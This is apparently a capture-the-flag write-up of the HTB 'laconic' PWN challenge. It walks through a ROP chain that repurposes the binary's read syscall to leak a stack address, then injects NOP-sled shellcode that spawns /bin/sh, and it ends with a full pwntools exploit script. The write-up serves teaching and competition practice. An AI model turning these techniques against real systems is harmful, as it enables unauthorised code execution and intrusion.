# HTB Cyber Apocalypse 2025 - laconic Writeup
**Date:** March 21, 2025
**Author:** s1gn3rs

## Challenge Information

- **Category:** PWN
- **Challenge Name:** laconic
- **Description:** Sir Alaric's struggles have plunged him into a deep and overwhelming sadness, leaving him unwilling to speak to anyone. Can you find a way to lift his spirits and bring back his courage?
- **Difficulty:** Easy

### Binary Security Features

```
Permissions:
    Arch:       amd64-64-little
    RELRO:      No RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x42000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
```

### Key Observations

- **No PIE:** ASLR is off, so we can use fixed addresses in our ROP chain.
- **Stack Canary:** No stack canary detected so a buffer overflow is easier to perform.
- **NX unknown and Stack Executable:** We can execute shellcode on the stack.
- **No RELRO** The Global Offset Table (GOT) is writable, so entries can be overwritten.
---

## Binary Analysis

### Challenge Core

```bash
Dump of assembler code for function _start:
   0x0000000000043000 <+0>:     mov    rdi,0x0
   0x0000000000043007 <+7>:     mov    rsi,rsp
   0x000000000004300a <+10>:    sub    rsi,0x8
   0x000000000004300e <+14>:    mov    rdx,0x106
   0x0000000000043015 <+21>:    syscall
   0x0000000000043017 <+23>:    ret
   0x0000000000043018 <+24>:    pop    rax
   0x0000000000043019 <+25>:    ret
End of assembler dump.
pwndbg>

```



### Important Findings
1. **We write directly to the stack, 8 bytes before RSP:** This gives us control over the return address.
2. **Buffer overflow length:** We can write up to `0x106` bytes.
3. **Gadget after the first RET:** A `pop rax; ret` gadget is available at the end of the dump.

---

## Exploiting File Descriptor Misassignment
This approach differs from the challenge author's original solution. The key observation was that it’s possible to control the `RAX` register and jump back to `_start` (at `0x43000`), effectively turning the syscall into an **arbitrary syscall** but with the following restrictions:

- `RDI = 0` (first argument)
- `RSI = RSP - 8` (second argument)
- `RDX = 0x106` (third argument)

This setup aligns with a `write` syscall in order to try to get a stack leak, but since `RDI = 0`, it attempts to write to `stdin`, which is typically not helpful.

When executing a binary like `./laconic` from a Python script using `process("./laconic")`, the stdin of the process is set to a **pipe**, used by `pwntools` to communicate with the process. That means our `write(0, ...)` syscall would attempt to write into the pipe, which is useless:
```bash
└─$ sudo ls -l /proc/92751/fd
total 0
lr-x------ 1 s1gn3rs s1gn3rs 64 Mar 26 23:21 0 -> 'pipe:[251098]'
lrwx------ 1 s1gn3rs s1gn3rs 64 Mar 26 23:21 1 -> /dev/pts/6
lrwx------ 1 s1gn3rs s1gn3rs 64 Mar 26 23:21 2 -> /dev/pts/6
```

But if instead of spawning the binary locally, we can use a socket and comunicate directly with it using `remote("localhost", 12345)`
```bash
└─$ socat TCP-LISTEN:12345,fork EXEC:"./laconic"
```

Now both `stdin`and `stdout` point to the same socket `socket:[236189]`, which makes a `write(0, ...)` syscall behave just like `write(1, ...)`, effectively sending data back to us. When using remote to the server it happens to have the same conditions has in this scenario.
```bash
└─$ sudo ls -l /proc/90853/fd
total 0
lrwx------ 1 s1gn3rs s1gn3rs 64 Mar 26 23:19 0 -> 'socket:[236189]'
lrwx------ 1 s1gn3rs s1gn3rs 64 Mar 26 23:19 1 -> 'socket:[236189]'
lrwx------ 1 s1gn3rs s1gn3rs 64 Mar 26 23:19 2 -> /dev/pts/2
```

## Exploit Code – File Descriptor Hijack & Stack Leak to Shell

After gaining control of `RAX` and the ability to jump back to `_start`, we can build an exploit in two stages:

1. **Stage 1** – Leak a stack address using a `write` syscall.
2. **Stage 2** – Inject shellcode using `read`, then jump to it for shell execution.


### Stage 1 – Stack Leak via Arbitrary Syscall

We craft a payload to:
- Set `RAX = 1` → triggering a `write` syscall.
- Write from `RSP - 8`, which is under our control.
- Jump back to `_start` afterward.

```python
payload  = b"A" * 8
payload += p64(gadgetPopRax)     # pop rax; ret
payload += p64(1)                # rax = 1 → write
payload += p64(_start)          # return to _start
payload += p64(gadgetPopRax)
payload += p64(0)                # rax = 0 → prepare for read
payload += p64(_start)          # return again to _start
```

## Stage 2 – Injecting Shellcode & Getting a Shell

With the leaked stack address from Stage 1, we can now inject shellcode and pivot execution to it.

Since we don’t know the exact offset between the leaked address and where our second-stage `read()` will write, we use a **NOP sled** and try multiple offsets.

---

### Payload Structure

The second payload consists of:
- A dummy return address (`"A" * 8`)
- A guessed return address pointing into the NOP sled (`leakStack + offset`)
- A NOP sled to improve our chances of landing correctly
- The actual shellcode (`execve("/bin/sh", ...)`)

---


```python
payload  = b"A" * 8
payload += p64(leakStack + 0x300 + 100 * i)  # Guess offset
payload += shellcode                         # Nop sled + Shellcode
```
### So this was the full exploit:

```python
#!/usr/bin/env python3

from pwn import *

e = ELF("laconic")

context.binary = e

def conn(cond):
    if cond == 1:
        r = process([e.path])
    elif cond == 2:
        r = gdb.debug([e.path], gdbscript="""
            
            """)
    elif cond == 3:
        r = remote("localhost", 12345)

    return r


def main():
    i = 0
    cond = True
    while cond:
        try:
            r = conn(3)

            _start = 0x43000
            gadgetPopRax = 0x43018


            shell = asm(shellcraft.sh())

            shellcode = b"\x90"*(0x106 - 16 - len(shell) - 1)
            print("AMOUNT OF NOPs: ", len(shellcode))
            shellcode += shell


            payload = b"A"*8 + p64(gadgetPopRax) + p64(1) + p64(_start) + p64(gadgetPopRax) + p64(0) + p64(_start)

            r.send(payload)

            output = r.recv()
            print(output[8:])
            output = output[32:]
            leakStack = output[:8][::-1]
            print(leakStack.hex())
            leakStack = int(leakStack.hex(), 16)
            print(hex(leakStack))


            payload = b"A"*8 + p64(leakStack + 0x300 + 100*i) + shellcode


            sleep(0.4)

            payload = payload.ljust(0x106, b"\x00")

            r.send(payload)


            r.sendline(b"ls /")
            r.recv()
            print("This iteration:", i)
            cond = False

        except EOFError:
            print("NOT This iteration:", i)
            i *= -1
            if i >= 0:
                i += 1
            r.close()



    r.interactive()

if __name__ == "__main__":
    main()
```
